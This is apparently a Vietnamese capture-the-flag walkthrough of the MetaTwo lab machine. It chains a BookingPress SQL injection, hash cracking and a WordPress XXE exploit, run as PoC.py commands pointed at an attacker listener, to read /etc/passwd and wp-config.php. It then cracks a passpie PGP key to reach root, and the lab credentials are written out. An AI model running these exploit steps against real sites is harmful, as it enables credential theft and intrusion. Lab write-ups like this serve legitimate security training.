# metatwo

- liệt kê các port mở

tìm thấy p21 ftp, p22 ssh, p80 http sử dụng nginx và wordpress 5.6.2

(Its version is vulnerable, but the exploit will only work when authenticated.)

![https://lh7-us.googleusercontent.com/se4jGHkdvtSgJh4GmiPyrdbhzmhgWBJGOMEs8CQCqcsJePOBRnGGCs7alg4dz0DchCkg0aWioOJBUukUr498PNx0xUhoQWwk9jwiPU0n5rAl5eU_3XPf5rMnuBMeTHzpAA7KwCv_4r2-](https://lh7-us.googleusercontent.com/se4jGHkdvtSgJh4GmiPyrdbhzmhgWBJGOMEs8CQCqcsJePOBRnGGCs7alg4dz0DchCkg0aWioOJBUukUr498PNx0xUhoQWwk9jwiPU0n5rAl5eU_3XPf5rMnuBMeTHzpAA7KwCv_4r2-)

lưu /etc/hosts

gobuster dir -u http://metapress.htb -w directory-list-lowercase-2.3-small.txt -x php,sh,py,js

![https://lh7-us.googleusercontent.com/CBPCE2STO_oy0azTnO0OrI3o1EQBOtvO8G0sTD-0vA9Bju27HKc5sKj7mhDRLYfBpejDhS3QwYaHHoQqiqYUSFrGpHoxHrLKQZEkhVpKPnKxrHodrX-Xo4cmO313GCQcXUG5O7Qk1AJl](https://lh7-us.googleusercontent.com/CBPCE2STO_oy0azTnO0OrI3o1EQBOtvO8G0sTD-0vA9Bju27HKc5sKj7mhDRLYfBpejDhS3QwYaHHoQqiqYUSFrGpHoxHrLKQZEkhVpKPnKxrHodrX-Xo4cmO313GCQcXUG5O7Qk1AJl)

có rất nhiều path và 1 status 200

- rce

thử truy cập url có status 200

giao diện login cần credential

![https://lh7-us.googleusercontent.com/HvMG2EBNCUWfk7mKOhuHw_KLV9wuS3feWiDVN-1bYGhWkqkccFMsZO1e3tfHoOAft_0AMRbKg0zpNTMg7VPapm-KuoM9FsUwgZiIfBtTsMgJvEsolOxpevIq6c6AL6b0ARmaBe0dM4H9](https://lh7-us.googleusercontent.com/HvMG2EBNCUWfk7mKOhuHw_KLV9wuS3feWiDVN-1bYGhWkqkccFMsZO1e3tfHoOAft_0AMRbKg0zpNTMg7VPapm-KuoM9FsUwgZiIfBtTsMgJvEsolOxpevIq6c6AL6b0ARmaBe0dM4H9)

truy cập p80 ko thấy entry point

từ /event kiểm tra các action -> có thể sqli

![https://lh7-us.googleusercontent.com/RJj2uY4-OLqfgCbbby_BhVli4o6EXY18ZW6F2TBmt3jk1jMLKcXo9XBSFi-UdNpZbJWpcRqzZGNg_7R7F52dI447FzBoXTrmbSPZW2LPGCy8xc_v0ksc7O2eH0HTGW3wNzo_NeeclfJI](https://lh7-us.googleusercontent.com/RJj2uY4-OLqfgCbbby_BhVli4o6EXY18ZW6F2TBmt3jk1jMLKcXo9XBSFi-UdNpZbJWpcRqzZGNg_7R7F52dI447FzBoXTrmbSPZW2LPGCy8xc_v0ksc7O2eH0HTGW3wNzo_NeeclfJI)

tìm thấy version của 1 plugin: bookingpress 1.0.10

![https://lh7-us.googleusercontent.com/6pMntgX9coEmwsvHGh7e3ERB3Lk7ZZK73wIAfnHHoXGfZM9oeRdPUmO3R_dgsqwC8aWOQPZKQp5VCDZtkDKapccqRbkmQjlPlsKhSk1ow84psPVX1wr7W7NdUDZ2jXE-crDQ7YB3V6-E](https://lh7-us.googleusercontent.com/6pMntgX9coEmwsvHGh7e3ERB3Lk7ZZK73wIAfnHHoXGfZM9oeRdPUmO3R_dgsqwC8aWOQPZKQp5VCDZtkDKapccqRbkmQjlPlsKhSk1ow84psPVX1wr7W7NdUDZ2jXE-crDQ7YB3V6-E)

search bookingpress plugin exploit

[https://github.com/destr4ct/CVE-2022-0739/blob/main/booking-press-expl.py](https://github.com/destr4ct/CVE-2022-0739/blob/main/booking-press-expl.py)

The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection

![https://lh7-us.googleusercontent.com/tEgNx_bXKVLbI6ZekijHqw2sw8CChX4kovJnHb7Y3_Th0qz7I2cN0FNQyr8u_ajGNFPotRyx9Sa7VeSG0cL0_QBOnUY3Py87KSSGWDsuYc-XKfH0IbSWcZ6-VtwT8wC6LesyxWyM13Tb](https://lh7-us.googleusercontent.com/tEgNx_bXKVLbI6ZekijHqw2sw8CChX4kovJnHb7Y3_Th0qz7I2cN0FNQyr8u_ajGNFPotRyx9Sa7VeSG0cL0_QBOnUY3Py87KSSGWDsuYc-XKfH0IbSWcZ6-VtwT8wC6LesyxWyM13Tb)

![https://lh7-us.googleusercontent.com/Mro1vrhODfckcaPrjkD60ersM4UNiKkYeoTJMUWCXzqklQiJUoRdjuqw3AjjZF0SSGu-XkmleW0PAux9HYrZ7s5ZmyLVERIKoWsA4WOJxxkd7zxFhN-2b83RV-SNbLfPqh7M01wr9iNY](https://lh7-us.googleusercontent.com/Mro1vrhODfckcaPrjkD60ersM4UNiKkYeoTJMUWCXzqklQiJUoRdjuqw3AjjZF0SSGu-XkmleW0PAux9HYrZ7s5ZmyLVERIKoWsA4WOJxxkd7zxFhN-2b83RV-SNbLfPqh7M01wr9iNY)

tìm thấy thông tin của 2 user

|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|

|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|

crack pw:

![https://lh7-us.googleusercontent.com/_jZlLSq4IgeKvHece6GWITTZ_75IX9IrFT4ztnIU8BOBQbG9CHiO0k4_wxwgRJO4yhNE5hV4RL9BAfPalLm60cawyMFHALRs_45kfguBlTvNnQsiYqmmVpEaXHQurcHhwC4SD8rCu9Hg](https://lh7-us.googleusercontent.com/_jZlLSq4IgeKvHece6GWITTZ_75IX9IrFT4ztnIU8BOBQbG9CHiO0k4_wxwgRJO4yhNE5hV4RL9BAfPalLm60cawyMFHALRs_45kfguBlTvNnQsiYqmmVpEaXHQurcHhwC4SD8rCu9Hg)

crack được pw của user manager

![https://lh7-us.googleusercontent.com/hPMq-6gnrGwR7gYcNpb9L6gwqiYKxdFWeSl6tTkB-BrIVt1MKR62t89P4zGSFSwrj437664LK-U_FeO-nPkwBf3RqbSrYL1nUVLkl8SyBelEEUgtk0TL3cbXd2XFD_pbnRdXUIICf36I](https://lh7-us.googleusercontent.com/hPMq-6gnrGwR7gYcNpb9L6gwqiYKxdFWeSl6tTkB-BrIVt1MKR62t89P4zGSFSwrj437664LK-U_FeO-nPkwBf3RqbSrYL1nUVLkl8SyBelEEUgtk0TL3cbXd2XFD_pbnRdXUIICf36I)

manager: partylikearockstar

dùng cho ftp → fail

login wordpress → success

![https://lh7-us.googleusercontent.com/kCB5RfyVDsXffHmOJJ6yoqDeNmoMN5q1p9N9Jv63gSL5kDR_a3a6Jv4I4wMMwdJ3Qs2P6UKlHe73cLmbVpzETWzJVlkj6c0ZfzpPD-iUZ__g0YxGyTwdjKfcMr_2c-b49QpY8SlbUVHE](https://lh7-us.googleusercontent.com/kCB5RfyVDsXffHmOJJ6yoqDeNmoMN5q1p9N9Jv63gSL5kDR_a3a6Jv4I4wMMwdJ3Qs2P6UKlHe73cLmbVpzETWzJVlkj6c0ZfzpPD-iUZ__g0YxGyTwdjKfcMr_2c-b49QpY8SlbUVHE)

search wordpress 5.6.2 exploit

[CVE-2021-29447-PoC/README.md at main · 0xRar/CVE-2021-29447-PoC (github.com)](https://github.com/0xRar/CVE-2021-29447-PoC/blob/main/README.md)

an XML external entity injection (XXE) security flaw in the WordPress Media Library. The vulnerability can be exploited only when this CMS runs in PHP 8 and the attacking user has permissions to upload media files.

thử đọc /etc/passwd

python3 PoC.py -l 10.10.14.28 -p 4433 -f /etc/passwd

![https://lh7-us.googleusercontent.com/U6GctoI-XkzTG07h1AcerE_aEfLUsBnUV0-jvR2TFiBq19-qaO6fKEGbvqAQmLiFoqJ-XKGroU9HIz84GQIybMsfgWFg-2jSM87816Yaj5ddukmHLiOIJwsJ-BPuogXK4AKa390882sN](https://lh7-us.googleusercontent.com/U6GctoI-XkzTG07h1AcerE_aEfLUsBnUV0-jvR2TFiBq19-qaO6fKEGbvqAQmLiFoqJ-XKGroU9HIz84GQIybMsfgWFg-2jSM87816Yaj5ddukmHLiOIJwsJ-BPuogXK4AKa390882sN)

upload .wav

![https://lh7-us.googleusercontent.com/UgL7tbgX2ks3EOXDcCdQjEZmeDncr9uSvNpG9s7OLelqqfH-_2InW1jShN_CJaPYWOScce_PvfOVLZFjfTioJKMB15BjgTLGIN9n2re5SxPrICoXZyOHOvmgG5iQXRe6Ew1Lm82hjbZF](https://lh7-us.googleusercontent.com/UgL7tbgX2ks3EOXDcCdQjEZmeDncr9uSvNpG9s7OLelqqfH-_2InW1jShN_CJaPYWOScce_PvfOVLZFjfTioJKMB15BjgTLGIN9n2re5SxPrICoXZyOHOvmgG5iQXRe6Ew1Lm82hjbZF)

đưa giá trị sau ?p= vào file decode.php

![https://lh7-us.googleusercontent.com/nwbLqNSkubgH9q4d1tjrFFvxKPRQNeIbWXrfUk3P5uaf09MjCApL5YGz3R8bHeKQCR9QoObWfadOk5hHr4mI6d_xZSWHKvLxqjpMPvQyRFLVSCUmpVRsU-_gyGqw5UtusLa3vsEQWBG5](https://lh7-us.googleusercontent.com/nwbLqNSkubgH9q4d1tjrFFvxKPRQNeIbWXrfUk3P5uaf09MjCApL5YGz3R8bHeKQCR9QoObWfadOk5hHr4mI6d_xZSWHKvLxqjpMPvQyRFLVSCUmpVRsU-_gyGqw5UtusLa3vsEQWBG5)

![https://lh7-us.googleusercontent.com/PGaLLpRi6DEDj-jm-qIEcVU-Vwczwi2WbAuAwjQV9XvnlEH6mVlsBj4uGmh3qXk95x15SIYKNHPep1cC-q9t6CTqxFPkflEufzCYU-4IOSfFJamqTeVaCmbbEWKS0CD23kyZgl86GK8E](https://lh7-us.googleusercontent.com/PGaLLpRi6DEDj-jm-qIEcVU-Vwczwi2WbAuAwjQV9XvnlEH6mVlsBj4uGmh3qXk95x15SIYKNHPep1cC-q9t6CTqxFPkflEufzCYU-4IOSfFJamqTeVaCmbbEWKS0CD23kyZgl86GK8E)

thấy có 1 user: jnelson

xem cấu hình nginx

python3 PoC.py -l 10.10.14.28 -p 4433 -f /etc/nginx/nginx.conf

![https://lh7-us.googleusercontent.com/RvcWfZRNuWO14MDPlO11UtCAT5Z1UeD0rkmnpEpdwyp9R_gda2Ieh4zQO9KKxPH-iMGkohZDJZXUOAIQqX4jilqLmFmsM0Ip86bc126f_MC9dln0OaAm9wZYdyZEYxQbcWTMudHNs--H](https://lh7-us.googleusercontent.com/RvcWfZRNuWO14MDPlO11UtCAT5Z1UeD0rkmnpEpdwyp9R_gda2Ieh4zQO9KKxPH-iMGkohZDJZXUOAIQqX4jilqLmFmsM0Ip86bc126f_MC9dln0OaAm9wZYdyZEYxQbcWTMudHNs--H)

xem các site enabled

python3 PoC.py -l 10.10.14.28 -p 4433 -f /etc/nginx/sites-enabled/default

![https://lh7-us.googleusercontent.com/Xtp0Y5YEc8EhmnnIWJtretXifT2qOAJrggzgDoDL2yBpGnvlej8wIkzeFG-4ge6tv2mS7eC8U85DOdaLWeLZ3PHb17uw_nc1LZERTq1Tv-TeVWyR3SUIV3CsGzGTUMRB7LDK-nYkdFha](https://lh7-us.googleusercontent.com/Xtp0Y5YEc8EhmnnIWJtretXifT2qOAJrggzgDoDL2yBpGnvlej8wIkzeFG-4ge6tv2mS7eC8U85DOdaLWeLZ3PHb17uw_nc1LZERTq1Tv-TeVWyR3SUIV3CsGzGTUMRB7LDK-nYkdFha)

tìm thấy root của web ở /var/www/metapress.htb/blog

xem cấu hình db của wordpress

python3 PoC.py -l 10.10.14.28 -p 4433 -f /var/www/metapress.htb/blog/wp-config.php

![https://lh7-us.googleusercontent.com/uqsTKpTnH6Ca3dE1HAc-C7rHi-fPOnMz2pSgvNjqTAlGT-wTK9oGfAFqra5Q7A_jqh5jCLUHL6CxFFgLhWXcSuATT4Ph1dwJ5GlwiVBky7ifX1czi8GAkCmpGa8CfNsVQ1ZOHQlagSjm](https://lh7-us.googleusercontent.com/uqsTKpTnH6Ca3dE1HAc-C7rHi-fPOnMz2pSgvNjqTAlGT-wTK9oGfAFqra5Q7A_jqh5jCLUHL6CxFFgLhWXcSuATT4Ph1dwJ5GlwiVBky7ifX1czi8GAkCmpGa8CfNsVQ1ZOHQlagSjm)

![https://lh7-us.googleusercontent.com/cdcfgJKgF0G9-isT9wHPzRYcpbfDwnzBQU_40ShjWG4v08thZZooybyUorTpOrvJii9XeQNauQEL60Od4m8KnZgr9Lyg2zaflp4PKAQFimBN3jcQU9AGXQUgR9FxXN2q5dYwKfZ7kmF1](https://lh7-us.googleusercontent.com/cdcfgJKgF0G9-isT9wHPzRYcpbfDwnzBQU_40ShjWG4v08thZZooybyUorTpOrvJii9XeQNauQEL60Od4m8KnZgr9Lyg2zaflp4PKAQFimBN3jcQU9AGXQUgR9FxXN2q5dYwKfZ7kmF1)

![https://lh7-us.googleusercontent.com/e3xWVO0Njm_f0coHLFoCgQgKjI_V0yddkpSKRuMhG5Ql9ay_Pn22KyTpanT1eKvNHAmxv9VCcHlKmoKUE7LFSjQOymlRm6W-0di6ElRigIXb2iqg61CFDljC1zuzmH0-LPZ1Ubd6Lvvp](https://lh7-us.googleusercontent.com/e3xWVO0Njm_f0coHLFoCgQgKjI_V0yddkpSKRuMhG5Ql9ay_Pn22KyTpanT1eKvNHAmxv9VCcHlKmoKUE7LFSjQOymlRm6W-0di6ElRigIXb2iqg61CFDljC1zuzmH0-LPZ1Ubd6Lvvp)

thấy thông tin đăng nhập ftp và db

635Aq@TdqrCwXFUZ

metapress.htb : 9NYS_ii@FyL_p5M2NvJ

kết nối ftp thành công

![https://lh7-us.googleusercontent.com/zjgVG3B7s2T24N5_R2wnhldjHXtY6G9okVhRETOBvD0hZUf9fTMUL0R02hypwto_YHsxsw0FEn-SvtmvBH88mdwESaunnztUNYVBPNiI3R7wBLx53AVLqkJmQnYG2LKPOv-YhhFhMTLW](https://lh7-us.googleusercontent.com/zjgVG3B7s2T24N5_R2wnhldjHXtY6G9okVhRETOBvD0hZUf9fTMUL0R02hypwto_YHsxsw0FEn-SvtmvBH88mdwESaunnztUNYVBPNiI3R7wBLx53AVLqkJmQnYG2LKPOv-YhhFhMTLW)

![https://lh7-us.googleusercontent.com/mMO-W1jcfHV_S5jecU8dJNDsXn2bTvGW-Zn2AlbYNF_wB80k7lFHoLljAEOSDEse1HjJuOkfXEjEb6xvfHwdM_uRpqu591BPmQk80EBVLZM3e1QI6vZU0JR0cqUWZr99V2OUj5LLf8SD](https://lh7-us.googleusercontent.com/mMO-W1jcfHV_S5jecU8dJNDsXn2bTvGW-Zn2AlbYNF_wB80k7lFHoLljAEOSDEse1HjJuOkfXEjEb6xvfHwdM_uRpqu591BPmQk80EBVLZM3e1QI6vZU0JR0cqUWZr99V2OUj5LLf8SD)

tìm thấy file source code khả nghi -> tải về và phân tích

![https://lh7-us.googleusercontent.com/lDqISMxi7CvpbJ6-KZhApgnZFdlKfbB-or6BW99kaftzhZY9shpEYNLhbDz3uFhN0GlBCRKh-_YMvuDsjx7WMM2PxHXCorGO8_UBU3NeBwioupnMrHvFfzvyTKC1HOmQmQp7Knztp9Uy](https://lh7-us.googleusercontent.com/lDqISMxi7CvpbJ6-KZhApgnZFdlKfbB-or6BW99kaftzhZY9shpEYNLhbDz3uFhN0GlBCRKh-_YMvuDsjx7WMM2PxHXCorGO8_UBU3NeBwioupnMrHvFfzvyTKC1HOmQmQp7Knztp9Uy)

![https://lh7-us.googleusercontent.com/Qy2k64PrmYI6hGJh5PEJ5otxf-G4VasUqBO85MhyvvzoDNbDmE-pe3LYMXqaZfoNAS-KwMIoj353nPB0dqKWqL0HmDgN26dUIR1E29fA3xjG7mBuaKjjXme7-bp-_9DDpxz5CL7pIC15](https://lh7-us.googleusercontent.com/Qy2k64PrmYI6hGJh5PEJ5otxf-G4VasUqBO85MhyvvzoDNbDmE-pe3LYMXqaZfoNAS-KwMIoj353nPB0dqKWqL0HmDgN26dUIR1E29fA3xjG7mBuaKjjXme7-bp-_9DDpxz5CL7pIC15)

tìm thấy thông tin đăng nhập của jnelson

jnelson@metapress.htb : Cb4_JmWM8zUZWMu@Ys

ssh thành công

![https://lh7-us.googleusercontent.com/TBD4k3ttpXR_mukF5ZXp0mEqjx9tKvoJCyXAzse5A2kFbu4t10EukqzLI50B6X_B-d9xB8qlzKNiqZ1zM3_cV8F_th5VBPODgMHPZEybEOIeGgpqdy2ggyOhWe-Fv1iXKT0I3wkEqq_D](https://lh7-us.googleusercontent.com/TBD4k3ttpXR_mukF5ZXp0mEqjx9tKvoJCyXAzse5A2kFbu4t10EukqzLI50B6X_B-d9xB8qlzKNiqZ1zM3_cV8F_th5VBPODgMHPZEybEOIeGgpqdy2ggyOhWe-Fv1iXKT0I3wkEqq_D)

lấy flag user

![https://lh7-us.googleusercontent.com/egBZoV5y4uCU5H-zTfwwyIJXSir-Ue_jGsDAxM3ml_dHJrgqllLb9cJ4KlKBUp0H8uIURiJNyGegWJNlW7C_Yxym7Sgza5UaXkHlByHIVaAbSwvak5IAuXdDB4fAkUpMDxrtcfxQ554H](https://lh7-us.googleusercontent.com/egBZoV5y4uCU5H-zTfwwyIJXSir-Ue_jGsDAxM3ml_dHJrgqllLb9cJ4KlKBUp0H8uIURiJNyGegWJNlW7C_Yxym7Sgza5UaXkHlByHIVaAbSwvak5IAuXdDB4fAkUpMDxrtcfxQ554H)

- pe

cần pw khi liệt kê các quyền được phép

![https://lh7-us.googleusercontent.com/E8S7hFvNUqrjkzVyGeMWAYnlKwHZ3jwEFdhBZ3BjnYD997YvwJKs94V5omUYcegrQ-Epz_19ToBSnLwVX75L-RD6denNHgCAkkKFRRWAOxxdfC0D12x2NScnGh1rrefui7yoph1HbBqK](https://lh7-us.googleusercontent.com/E8S7hFvNUqrjkzVyGeMWAYnlKwHZ3jwEFdhBZ3BjnYD997YvwJKs94V5omUYcegrQ-Epz_19ToBSnLwVX75L-RD6denNHgCAkkKFRRWAOxxdfC0D12x2NScnGh1rrefui7yoph1HbBqK)

tìm thấy thư mục ẩn, trong đó chứa các thông tin nhạy cảm như key và pw

search passpie - Passpie is a command line tool to manage passwords from the terminal with a colorful and configurable interface. Use a master passphrase to decrypt login credentials, copy passwords to clipboard, syncronize with a git repository, check the state of your passwords, and more.

![https://lh7-us.googleusercontent.com/LkYCvp24VV-wqDXMk2bHJwL3Wjzc2Zn7GxOEOsdhg46BYdJ6E4oqIz11tnz3p2yHTn2yFByeAFt2htRXIOzRZRpevJVMStcFWVnI0H18ECsRV0tHrfc_mI-qlElz35qvRWZ7iS7coHQZ](https://lh7-us.googleusercontent.com/LkYCvp24VV-wqDXMk2bHJwL3Wjzc2Zn7GxOEOsdhg46BYdJ6E4oqIz11tnz3p2yHTn2yFByeAFt2htRXIOzRZRpevJVMStcFWVnI0H18ECsRV0tHrfc_mI-qlElz35qvRWZ7iS7coHQZ)

file .keys chứa private và public key

![https://lh7-us.googleusercontent.com/_yjiMUKJEulebP8akw8_GeeXVYR-dD77cg75QqEP_3mmqTrig_9xu6CChx54bUh-ioPMwsBehRf3CM2D4LPs-N_W37ds0noDHdxysCyxZGKDF7AOQGmMzd7ITGaD6sQShGwOLEydRI8Y](https://lh7-us.googleusercontent.com/_yjiMUKJEulebP8akw8_GeeXVYR-dD77cg75QqEP_3mmqTrig_9xu6CChx54bUh-ioPMwsBehRf3CM2D4LPs-N_W37ds0noDHdxysCyxZGKDF7AOQGmMzd7ITGaD6sQShGwOLEydRI8Y)

file root.pass lưu trữ message với format pgp và được encrypt bởi 1 key

![https://lh7-us.googleusercontent.com/3DHbwqv3vWyevZ5ATWwKf7fWUoHs_muD8wvVgWoHAmxgZUVFai40pC9vYe38AzDRK7i-_a6ZfwSuObJ8NovhJxGNa-l_qrKQ6AGoZ4xoOXpFXBYxnuF4pmTIaW7rq_5w6RVU03yq38P0](https://lh7-us.googleusercontent.com/3DHbwqv3vWyevZ5ATWwKf7fWUoHs_muD8wvVgWoHAmxgZUVFai40pC9vYe38AzDRK7i-_a6ZfwSuObJ8NovhJxGNa-l_qrKQ6AGoZ4xoOXpFXBYxnuF4pmTIaW7rq_5w6RVU03yq38P0)

dùng john crack passphrase và export pw từ passpie

tạo server để từ attacker tải xuống file .keys

![https://lh7-us.googleusercontent.com/go_Wh5Q37jGnDmM5vmlkezJrX89N0vGDX9NbGERYb7WgRexG_x3FQSTUwuQCa-hO2JShyLKoF6AlzlsnF1qxxddhlic3G7hcBxkR3WoWZlijmtN3Dzju1JRp7JbzuZTtoDDX3wjmlvB5](https://lh7-us.googleusercontent.com/go_Wh5Q37jGnDmM5vmlkezJrX89N0vGDX9NbGERYb7WgRexG_x3FQSTUwuQCa-hO2JShyLKoF6AlzlsnF1qxxddhlic3G7hcBxkR3WoWZlijmtN3Dzju1JRp7JbzuZTtoDDX3wjmlvB5)

![https://lh7-us.googleusercontent.com/cLXjt9UmyVGU1GTmxeIAu3kUMgtAxHy7Mc4mcBdIgsR27jJGGmBMSfremZrRqsmWxOFb5ximvP5xNrZR5Q54XimSX0vwFWv8iuvqCxuCYWhdVkU1mlVljvw3zWqzswpPzY237Gb1ePyN](https://lh7-us.googleusercontent.com/cLXjt9UmyVGU1GTmxeIAu3kUMgtAxHy7Mc4mcBdIgsR27jJGGmBMSfremZrRqsmWxOFb5ximvP5xNrZR5Q54XimSX0vwFWv8iuvqCxuCYWhdVkU1mlVljvw3zWqzswpPzY237Gb1ePyN)

![https://lh7-us.googleusercontent.com/0AFIa4I4ZNoRbkL2awmYJl5RLfgr4QwVb6900P0RL371IR3gSq3zVtl1w5nkdte_al4hMUNDS6aM8Y8AxO-qTwWDLlmJJa1q2NpgmrYNr-03FZF100KUUVsHuyoQn5MWjJI7O18ZKj_J](https://lh7-us.googleusercontent.com/0AFIa4I4ZNoRbkL2awmYJl5RLfgr4QwVb6900P0RL371IR3gSq3zVtl1w5nkdte_al4hMUNDS6aM8Y8AxO-qTwWDLlmJJa1q2NpgmrYNr-03FZF100KUUVsHuyoQn5MWjJI7O18ZKj_J)

xóa public key trước khi convert sang format john

![https://lh7-us.googleusercontent.com/yMTD3VkgR8V0SAhWTP7msF925XcSwuEHo2DIiqEH-o8gJHvHXG0paxqCQEDvJLH87tNv0jqGPSgUYz5919lp7o1IOaT3YGyXmYZjmZlh4IzpqWyxkkvXXcxudgpRn2viN6x7IZNjkDxJ](https://lh7-us.googleusercontent.com/yMTD3VkgR8V0SAhWTP7msF925XcSwuEHo2DIiqEH-o8gJHvHXG0paxqCQEDvJLH87tNv0jqGPSgUYz5919lp7o1IOaT3YGyXmYZjmZlh4IzpqWyxkkvXXcxudgpRn2viN6x7IZNjkDxJ)

crack key

![https://lh7-us.googleusercontent.com/5_M45oAEKz1I9hmPYn6_53V9MhoJ6UkLQaC4XwI4mT82z1omEWxaghLHf4JNZmrNf3Rae9eQGHVLlDlCsoW7dZ0rXdKtdlDJjDyzcRTST9gM5twpnxQhbRTOkvfOzGL-76elRjV5Z8GD](https://lh7-us.googleusercontent.com/5_M45oAEKz1I9hmPYn6_53V9MhoJ6UkLQaC4XwI4mT82z1omEWxaghLHf4JNZmrNf3Rae9eQGHVLlDlCsoW7dZ0rXdKtdlDJjDyzcRTST9gM5twpnxQhbRTOkvfOzGL-76elRjV5Z8GD)

blink182

tạo file pass rỗng

kiểm tra có tồn tại user khác nữa không

export pw sang file pass vừa tạo

có thông tin đăng nhập của root

![https://lh7-us.googleusercontent.com/YUs5K5tOfuKK3VnmofYeDrTjoQ1MsS8X3r2o3pUOmMYstZFrMW5fyNCXNtA1nSIzZb2dbT42JYvD3gNPAqwp5dnkvwtqK7TAFeUX913saxquPtTqynSQ8w94gFYhtNfXeUPYyNzIIH4F](https://lh7-us.googleusercontent.com/YUs5K5tOfuKK3VnmofYeDrTjoQ1MsS8X3r2o3pUOmMYstZFrMW5fyNCXNtA1nSIzZb2dbT42JYvD3gNPAqwp5dnkvwtqK7TAFeUX913saxquPtTqynSQ8w94gFYhtNfXeUPYyNzIIH4F)

p7qfAZt4_A1xo_0x

![https://lh7-us.googleusercontent.com/42Cz7ojeOfbxGijGS7dek-44p5_Ysr2nrQS-mJjIuNEhHpZ9VR3FFocgAody0s0GwUKC-BmBm_h8f_accdZ6jHE6ARWWCgD5g8gc1fgKGx_b1CBUQO9Y68ADc9MdJh3G6J77g-jkRVb4](https://lh7-us.googleusercontent.com/42Cz7ojeOfbxGijGS7dek-44p5_Ysr2nrQS-mJjIuNEhHpZ9VR3FFocgAody0s0GwUKC-BmBm_h8f_accdZ6jHE6ARWWCgD5g8gc1fgKGx_b1CBUQO9Y68ADc9MdJh3G6J77g-jkRVb4)

lấy flag root

![https://lh7-us.googleusercontent.com/iiX-Y2DFmmmPLUwqnu2sDVMGo_speBoaG28xoCA6AP5YDoMPsOKeeFd_LBByn4M04CkQwF_L1SiNXaW0k2OrLmUMdCh4WZ1vLCcX8RGSfYBuLy3htLN9pTrRp9NB77GnaCS7Wt49OaY_](https://lh7-us.googleusercontent.com/iiX-Y2DFmmmPLUwqnu2sDVMGo_speBoaG28xoCA6AP5YDoMPsOKeeFd_LBByn4M04CkQwF_L1SiNXaW0k2OrLmUMdCh4WZ1vLCcX8RGSfYBuLy3htLN9pTrRp9NB77GnaCS7Wt49OaY_)